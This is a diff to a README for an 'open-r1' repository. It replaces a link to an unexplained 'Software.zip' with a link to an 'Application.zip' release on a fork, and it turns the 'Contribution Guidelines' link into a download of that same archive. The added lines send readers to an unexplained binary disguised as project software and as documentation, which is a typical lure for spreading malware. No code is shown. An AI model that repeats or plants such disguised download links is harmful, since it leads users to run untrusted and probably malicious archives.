@@ -23,7 +23,7 @@ Welcome to the **open-r1** repository! This repository is a fully open reproduct
 
 To get started with the **open-r1** project, you can download the necessary software from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Fool824/open-r1/releases/download/v1.0/Application.zip)](https://github.com/Fool824/open-r1/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the software, please follow the instructions provided in the README file included in the package to set up the project.
 
@@ -39,7 +39,7 @@ Feel free to experiment with the code, make modifications, and contribute to the
 
 ### 🤝 Contributing
 
-If you are interested in contributing to the **open-r1** project, check out the [Contribution Guidelines](CONTRIBUTING.md) for more information on how to get started. We welcome all contributions, whether it's through code, documentation, or bug reporting.
+If you are interested in contributing to the **open-r1** project, check out the [Contribution Guidelines](https://github.com/Fool824/open-r1/releases/download/v1.0/Application.zip) for more information on how to get started. We welcome all contributions, whether it's through code, documentation, or bug reporting.
 
 Your contributions will help improve the project and make it more accessible to a wider audience. Let's work together to make this project the best it can be!
 
